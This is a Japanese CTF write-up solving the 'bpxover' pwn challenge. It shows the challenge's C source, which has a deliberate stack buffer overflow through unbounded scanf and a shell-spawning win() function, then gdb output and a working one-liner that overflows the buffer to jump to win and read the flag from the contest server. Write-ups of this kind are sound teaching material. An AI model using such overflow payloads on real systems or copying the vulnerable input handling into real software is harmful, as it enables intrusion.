# bpxover:pwn:100pts
C言語のコードの中にはアセンブリも書けるらしいです。え、そんなこと言ってる場合じゃないって？  
注意：bpxoverとbpxorは関連した問題です。 配布ファイルの差分を見ることをおすすめします。  
`nc chall.live.ctf.tsg.ne.jp 30006`  
[bpxover.tar.gz](bpxover.tar.gz)  

# Solution
接続先とソースが配布されている。  
ソースは以下のようであった。  
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win() {
    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    char buf[16];

    puts("hello :)");
    scanf("%s", buf);
    long x = strtoll(buf, NULL, 10);
    asm ("xor %0, %%rbp\n\t"
            :
    : "r" (x));

    return 0;
}
```
自明なBOFがあるためwinへ飛ばせばよい。  
```bash
$ gdb ./chall
~~~
gdb-peda$ checks
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ disas win
Dump of assembler code for function win:
   0x00000000004011b6 <+0>:     endbr64
   0x00000000004011ba <+4>:     push   rbp
   0x00000000004011bb <+5>:     mov    rbp,rsp
   0x00000000004011be <+8>:     sub    rsp,0x10
   0x00000000004011c2 <+12>:    lea    rax,[rip+0xe3b]        # 0x402004
   0x00000000004011c9 <+19>:    mov    QWORD PTR [rbp-0x10],rax
   0x00000000004011cd <+23>:    mov    QWORD PTR [rbp-0x8],0x0
   0x00000000004011d5 <+31>:    lea    rax,[rbp-0x10]
   0x00000000004011d9 <+35>:    mov    edx,0x0
   0x00000000004011de <+40>:    mov    rsi,rax
   0x00000000004011e1 <+43>:    lea    rdi,[rip+0xe1c]        # 0x402004
   0x00000000004011e8 <+50>:    call   0x401090 <execve@plt>
   0x00000000004011ed <+55>:    nop
   0x00000000004011ee <+56>:    leave
   0x00000000004011ef <+57>:    ret
End of assembler dump.
gdb-peda$ q
$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb6\x11\x40\x00\x00\x00\x00";cat) | nc chall.live.ctf.tsg.ne.jp 30006
hello :)
ls
chall
flag
start.sh
cat flag
TSGLIVE{welcome_overflowwwwwwwwww}
```
flagが得られた。  

## TSGLIVE{welcome_overflowwwwwwwwww}